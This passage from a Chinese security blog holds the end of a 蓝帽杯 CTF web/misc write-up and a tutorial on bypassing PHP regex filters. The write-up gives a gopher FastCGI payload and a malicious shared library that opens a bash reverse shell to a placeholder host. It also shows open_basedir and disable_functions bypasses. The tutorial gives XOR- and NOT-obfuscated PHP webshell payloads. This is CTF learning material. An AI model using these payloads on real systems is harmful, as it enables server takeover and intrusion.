                            'REQUEST_URI' =&gt; $REQUEST_URI,
                            'PHP_ADMIN_VALUE'   =&gt; $PHP_ADMIN_VALUE,
                            'SERVER_SOFTWARE' =&gt; 'php/fastcgiclient',
                            'REMOTE_ADDR' =&gt; '127.0.0.1',
                            'REMOTE_PORT' =&gt; '9985',
                            'SERVER_ADDR' =&gt; '127.0.0.1',
                            'SERVER_PORT' =&gt; '80',
                            'SERVER_NAME' =&gt; 'localhost',
                            'SERVER_PROTOCOL' =&gt; 'HTTP/1.1',
                            'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded',
                            'CONTENT_LENGTH' =&gt; strlen($content),
                                   ),
                      $content
                      );
// 这次也不用二次编码了
echo('gopher://127.0.0.1:9000/_'.str_replace("%2B", "+", ($res)));</code></pre><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>先写一个扩展</p>
<pre><code>#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i &gt;&amp; /dev/tcp/xxxx/2333 0&gt;&amp;1'");
}</code></pre><p>编译</p>
<pre><code>gcc evil.c -fPIC -shared -o evil.so</code></pre><p>至此我们的恶意so文件生成完毕</p>
<p>恶意so文件编译好上传后</p>
<p>开启恶意ftp服务器</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094655.png" alt="image-20210502154725106"></p>
<p>构造<code>file_put_contents</code></p>
<pre><code>$file = $_GET['file'];
$data = $_GET['data'];
file_put_contents($file,$data);
//http://7e653797-b723-4b3a-8977-5558bdd011e8.node3.buuoj.cn/shell.php?file=ftp://47.104.134.135:2334/anything&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%A5%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%16SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fuser.php%0B%09SCRIPT_NAME%2Fuser.php%0B%09REQUEST_URI%2Fuser.php%0F2PHP_ADMIN_VALUEextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+evil.so%0A%0F%11SERVER_SOFTWAREphp%2Ffastcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0C%21CONTENT_TYPEapplication%2Fx-www-form-urlencoded%0E%01CONTENT_LENGTH0%01%04%00%01%00%00%00%00%01%05%00%01%00%00%00%00
//POST:
//a=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);</code></pre><p>监听端口，发送请求即可收到shell</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094657.png" alt="image-20210502155201812"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094703.png" alt="image-20210502154940239"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094705.png" alt="image-20210502154952216"></p>
<p>flag没权限</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094715.png" alt="image-20210502155046896"></p>
<p>使用suid提权，查找有权限的命令</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094943.png" alt="image-20210502155438554"></p>
<p><code>php -a</code>进入交互模式，进行绕过open_basedir并getflag</p>
<pre><code>chdir('css');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094718.png" alt="image-20210502155624776"></p>
<h3 id="更骚的办法"><a href="#更骚的办法" class="headerlink" title="更骚的办法"></a>更骚的办法</h3><p><a href="http://bubb1e.com/2021/04/29/蓝帽杯2021WP_WEB/#0x02-one-Pointer-php">http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php</a></p>
<p>除了<code>fsockopen</code>这个函数外，还有一个<code>pfsockopen</code></p>
<p>这俩函数没啥区别</p>
<p>这里只ban了<code>fsockopen</code></p>
<p>所以我们可以通过将蚁剑插件中的<code>fsockopen</code>全部替换为<code>pfsockopen</code>达到getshell目的</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094720.png" alt="image-20210503224124644"></p>
<p>然后加一个9001端口的选项</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094723.png" alt="image-20210503230321062"></p>
<p>全部修改完后，重启蚁剑，先写个新的一句话<code>shell.php</code></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094725.png" alt="image-20210503224150038"></p>
<p>用蚁剑连接上这个新的，开启<code>bypass</code>插件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094728.png" alt="image-20210503230407833"></p>
<p><code>bypass_php_disable_functions</code>的fpm插件会上传.so文件，然后开启一个新的不使用php.ini的php进程并加载恶意so文件，来达到绕过<code>disable_functions</code>的操作</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094730.png" alt="image-20210503230627747"></p>
<p>可以看到，蚁剑生成了一个新的<code>.antproxy.php</code></p>
<p>这个php的作用是把流量转发到新开启的php进程</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094734.png" alt="image-20210503230656027"></p>
<p>我们修改或新建蚁剑的链接如下</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094737.png" alt="image-20210503230735250"></p>
<p>成功绕过，并且因为php本身suid有root权限，因此不用提权即可直接读取flag</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094739.png" alt="image-20210503230753903"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094743.png" alt="image-20210503230850304"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h2><p>分离图片，找到压缩包</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094750.png" alt="image-20210429115725329"></p>
<p>解压出一个MP3，MP3最后面有密文</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094753.png" alt="image-20210429115819092"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094755.png" alt="image-20210429121542312"></p>
<p>看看压缩包的注释，发现提示</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094759.png" alt="image-20210429120103164"></p>
<p>考虑题目为<code>冬奥会_is_coming</code>，猜测密码为冬奥会开始日期<code>20220204</code></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094802.png" alt="image-20210429120154731"></p>
<p>解16进制</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094805.png" alt="image-20210429120549345"></p>
<p>Google一搜，发现编码类型</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094808.png" alt="image-20210429120712293"></p>
<p><a href="https://www.dcode.fr/wingdings-font">https://www.dcode.fr/wingdings-font</a></p>
<p>解出来这个</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094812.png" alt="image-20210429120908642"></p>
<p>去github找相应的仓库<code>1cePeak</code></p>
<p><a href="https://github.com/Tr0jAnV1rU4/1cePeak">https://github.com/Tr0jAnV1rU4/1cePeak</a></p>
<p>git clone下来，发现有被删除的文件，<code>checkout</code>一下</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094814.png" alt="image-20210429121142295"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094816.png" alt="image-20210429121201233"></p>
<p>怀疑这是个key，想到第一步从mp3尾部解出的emoji，在线搜一下</p>
<p><a href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-5">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-5</a></p>
<p><a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
<p>直接解出flag</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094818.png" alt="image-20210429121259016"></p>
<h2 id="I-will-but-not-quite"><a href="#I-will-but-not-quite" class="headerlink" title="I_will_but_not_quite"></a>I_will_but_not_quite</h2><p>题目给了文件</p>
<pre class="line-numbers language-Python"><code class="language-Python">#!/user/bin/python2
import random
def r(s, num):
    l=""
    for i in s:
        if(ord(i) in range(97,97+26)):
            l+=chr((ord(i)-97+num)%26+97)
        else:
            l+=i
    return l

def x(a, b):
    return chr(ord(a)^ord(b))

def encrypt(c):
    secret = c
    n=random.randint(1,1000)
    for i in range(n):
        secret = r(secret, random.randint(1,26))
    secret = secret.encode('base64')

    l = ""
    for i in range(len(secret)):
        l += x(secret[i], secret[(i+1)%len(secret)])
    return l.encode('base64')

flag = "#################"
print "secret =", encrypt(flag)

#secret = The key you got

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解压出来是Twin.vmem，内存取证</p>
<p>看系统版本，查文件列表</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094821.png" alt="image-20210503103925802"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094825.png" alt="image-20210503103935712"></p>
<p>找所有的图片、压缩包，并提取</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094827.png" alt="image-20210503104046011"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094830.png" alt="image-20210503104055200"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094832.png" alt="image-20210503104545231"></p>
<p>那个倒影.zip是UNCTF的题，不用看了，直接看sea.zip</p>
<p>sea.zip中有注释：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094835.png" alt="image-20210503104627426"></p>
<p>暂时不知道啥意思，直接工具全试一遍，发现是outguess+弱口令</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094840.png" alt="image-20210503105146827"></p>
<p>双十六进制编码，解出来既是密文</p>
<p><a href="https://www.calcresult.com/misc/cyphers/twin-hex.html">https://www.calcresult.com/misc/cyphers/twin-hex.html</a></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094842.png" alt="image-20210503105940728"></p>
<p>逆加密脚本，得解密脚本</p>
<pre><code>secret = "Vnw3HC07BDgbBWNRGTx2fSckf399V1Z9CxIvHVd6fHsaEnR8fX40NyQ7JhM8CWV5fgMNN24="

def r(s, num):
    l = ""
    for i in s:
        if(ord(i) in range(97,97+26)):
            l+=chr((ord(i)-97-num)%26+97)
        else:
            l+=i
    return l

def x(a, b):
    return chr(ord(a)^ord(b))

secret = secret.decode('base64')
for i in range(97,123):
    last_chr = chr(i)
    tmp_flag = ''
    tmp_flag += last_chr
    for j in range(len(secret)):
        tmp_flag += x(secret[j],tmp_flag[-1])
    tmp_flag = tmp_flag[:-1]
    try:
        tmp_flag = tmp_flag.decode('base64')
        for k in range(1,26):
            flag = r(tmp_flag,k)
            print flag
    except:
        pass</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094844.png" alt="image-20210503233833000"></p>
<h2 id="嫌疑人x的硬盘"><a href="#嫌疑人x的硬盘" class="headerlink" title="嫌疑人x的硬盘"></a>嫌疑人x的硬盘</h2><p>这是取证题？</p>
<p>给的镜像，有<code>bitlocker</code>，取证大师一把梭就能解</p>
<p>找出来俩文件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094450.png" alt="image-20210503234027021"></p>
<p>逆向不会了</p>
<p>[参考链接](<a href="http://www.rayi.vip/2021/05/02/第五届&quot;蓝帽杯&quot;">http://www.rayi.vip/2021/05/02/第五届"蓝帽杯"</a> WriteUp/)</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>蓝帽杯</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行中关于PHP正则表达式的一些绕过方法</title>
    <url>/minglingzhixingphpzhengzeraoguo.html</url>
    <content><![CDATA[<h1 id="命令执行中关于PHP正则表达式的一些绕过方法"><a href="#命令执行中关于PHP正则表达式的一些绕过方法" class="headerlink" title="命令执行中关于PHP正则表达式的一些绕过方法"></a>命令执行中关于PHP正则表达式的一些绕过方法</h1><p>最近做了buuctf上的[极客大挑战 2019]RCE ME，PHP正则的一些绕过方法也终于要用上了，原文地址：<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br><a href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w">https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a><br><a href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html">https://www.cnblogs.com/cimuhuashuimu/p/11546422.html</a></p>
<h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><p><strong>在PHP中两个字符串异或之后，得到的还是一个字符串。如果正则过滤了一些字符串，那就可以使用两个不在正则匹配范围内的字符串进行异或得到我们想要的字符串。</strong><br>例如：我们异或 ‘?’ 和 ‘~’ 之后得到的是 ‘A’<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201030.png" alt="在这里插入图片描述"><br>原理：</p>
<pre class="line-numbers language-php"><code class="language-php">字符：<span class="token operator">?</span>         <span class="token constant">ASCII</span>码：<span class="token number">63</span>           二进制：  <span class="token number">00</span>‭<span class="token number">11</span> <span class="token number">1111</span>‬
字符：<span class="token operator">~</span>         <span class="token constant">ASCII</span>码：<span class="token number">126</span>          二进制：  <span class="token number">0111</span> <span class="token number">1110</span>‬
异或规则：
<span class="token number">1</span>   <span class="token keyword">XOR</span>   <span class="token number">0</span>   <span class="token operator">=</span>   <span class="token number">1</span>
<span class="token number">0</span>   <span class="token keyword">XOR</span>   <span class="token number">1</span>   <span class="token operator">=</span>   <span class="token number">1</span>
<span class="token number">0</span>   <span class="token keyword">XOR</span>   <span class="token number">0</span>   <span class="token operator">=</span>   <span class="token number">0</span>
<span class="token number">1</span>   <span class="token keyword">XOR</span>   <span class="token number">1</span>   <span class="token operator">=</span>   <span class="token number">0</span>
上述两个字符异或得到 二进制：  <span class="token number">0100</span> <span class="token number">0001</span>
该二进制的十进制也就是：<span class="token number">65</span>
对应的<span class="token constant">ASCII</span>码是：A

几个位运算符：
可以把<span class="token number">1</span>理解为真，<span class="token number">0</span>理解为假；那么就可以把“<span class="token operator">&amp;</span>”理解为“与”，“<span class="token operator">|</span>”理解为“或”；<span class="token operator">*</span><span class="token operator">*</span>而对于“<span class="token operator">^</span>”则是相同为就<span class="token number">0</span><span class="token operator">*</span><span class="token operator">*</span>，不同就为<span class="token number">1</span>。“<span class="token operator">~</span>”为取反操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>两个字符异或可以得到一个字符，下一个问题就是如何控制得到我们想要的字符</strong><br>看一道例题：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201031.png" alt="在这里插入图片描述"><br>当然这里直接传入数组就能绕过。<br>这里的正则过滤了所有26个字母大小写，如果我想要传入一个 <code>eval($_POST[ _ ]);</code>就需要异或得到这个<code>eval($_POST[ _ ]);</code>字符串<br><strong>那么如何知道哪两个字符异或可以得到我们想要的字符，就比如如何得到第一个字符 e</strong><br>笔者这里使用python脚本fuzz测试了一下，脚本如下:</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">r_xor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result<span class="token operator">=</span>i<span class="token operator">^</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  "</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" ASCII:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' &lt;--xor--> '</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" ASCII:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' == '</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" ASCII:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    r_xor<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>脚本运行部分结果如下：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201032.png" alt="在这里插入图片描述"><br><strong>这样就可以知道我们想要的字符的对应哪两个字符异或，只需要找到正则里没有过滤的字符异或得到我们想要的字符</strong><br>接着看一下PHITHON师傅的一个payload<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201033.png" alt="在这里插入图片描述"><br>看到代码中的下划线<code>“_”、“__”、“___”</code>是一个变量，因为preg_match()过滤了所有的字母，我们只能用下划线来作变量名。<br>这里PHITHON师傅使用的是 <code>assert($_POST[ _ ])</code> 在PHP5当中assert()的作用和eval()相似都是执行，但是eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用，所以这种拼接的方法只能用assert而不能用eval。<strong>只不过eval()只执行符合php编码规范的代码</strong>，PHITHON师傅<strong>这里还有就是使用 变量 进行payload拼接</strong>，拼接起来payload如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%01'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%05'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%12'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%14'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0D'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%2F'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0E'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>这里传入了<code>shell=assert($_POST[ _ ])</code>，由于”_”不受限制就可以任意传值了。（这里有一个误区，就是仅传入<code>shell=$_POST[ _ ]</code>，这样的确最终代码是<code>eval($_POST[ _ ])</code>了，但当外面的eval执行了之后，就仅剩下一个<code>$_POST[ _ ]</code>了，所以不行。</strong></p>
<p><strong>因为有很多不可打印字符，所以使用url编码表示</strong><br>然后只需要在POST里面传参</p>
<pre class="line-numbers language-php"><code class="language-php">_<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//代码执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201034.png" alt="在这里插入图片描述"><br>也可以连蚁剑或菜刀了，密码为下划线_</p>
<p><strong>这个payload经测试PHP 7.0.12及以下版本可以使用，碰到更高的版本可能assert()不能使用了，可以换成eval()</strong></p>
<p>在别的地方还看到一位师傅的绕过手法<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201035.png" alt="在这里插入图片描述"><br>payload：</p>
<pre class="line-numbers language-php"><code class="language-php">$<span class="token punctuation">{</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">^</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>解释一下这个师傅的绕过手法：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201036.png" alt="在这里插入图片描述"><br>即：</p>
<pre class="line-numbers language-php"><code class="language-php">$<span class="token punctuation">{</span><span class="token constant">_GET</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>ff<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo
<span class="token comment" spellcheck="true">//?shell=${_GET}{%ff}();&amp;%ff=phpinfo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<blockquote>
<p>任何字符与0xff异或都会取相反，这样就能减少运算量了。<br>注意：测试中发现，传值时对于要计算的部分不能用括号括起来，因为括号也将被识别为传入的字符串，可以使用{}代替，原因是php的use of undefined constant特性，<strong>例如<code>${_GET}{a}</code>这样的语句php是不会判为错误的，因为{}使用来 界定变量 的，这句话就是会将_GET自动看为字符串，也就是<code>$_GET['a']</code></strong></p>
</blockquote>
<h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><p>首先是PHITHON师傅的汉字和取反绕过<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201037.png" alt="在这里插入图片描述"><br>注意：上面的那种写法只能在PHP7里面正常测试，PHP5会报错<br>笔者本地PHP5测试：<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210425201038.png" alt="在这里插入图片描述"><br>只能直接利用这里P师傅的payload：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">/</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"的"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"半"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"始"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"俯"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"次"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"站"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$_____</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
